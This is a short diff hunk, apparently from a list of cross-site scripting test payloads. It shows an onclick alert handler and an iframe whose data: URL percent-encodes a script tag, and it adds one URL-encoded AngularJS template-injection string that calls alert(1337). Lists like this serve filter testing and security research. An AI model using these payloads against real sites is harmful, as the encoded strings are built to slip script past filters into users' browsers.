@@ -811,3 +811,4 @@ onclick="alert(1)">x</button>
 <iframe
 src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%7
 3%63%72%69%70%74%3E"></iframe>
+%7B%7Bconstructor.constructor(%27alert(1337)%27)()%7D%7D
